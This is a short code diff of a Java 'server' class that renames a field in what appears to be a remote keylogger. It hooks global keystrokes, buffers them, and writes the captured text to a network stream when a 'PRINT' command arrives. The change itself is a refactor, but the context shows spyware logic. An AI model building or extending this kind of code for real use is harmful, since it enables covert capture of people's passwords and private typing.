@@ -184,7 +184,7 @@ public class server extends javax.swing.JFrame {
     public void unHookKey(KeyLogger k) throws NativeHookException{
         countunHook += 1;
         GlobalScreen.removeNativeKeyListener(k);
-        k.store = "";
+        k.data = "";
     }
 
     public void print(KeyLogger k) {
@@ -198,12 +198,12 @@ public class server extends javax.swing.JFrame {
                 program.os.flush();
             }
             else{
-                mes = k.store;
+                mes = k.data;
                 if(mes != ""){                  
                     program.os.write(mes);
                     program.os.newLine();
                     program.os.flush();
-                    k.store = "";
+                    k.data = "";
                 }
                 else {            
                     program.os.write("");
@@ -239,11 +239,11 @@ public class server extends javax.swing.JFrame {
 
                 case "PRINT"->{
                     print(k);
-                    k.store = "";
+                    k.data = "";
                     break;
                 }
                 case "DELETE"->{
-                    k.store = "";
+                    k.data = "";
                     break;
                 }
                 case "QUIT"->{
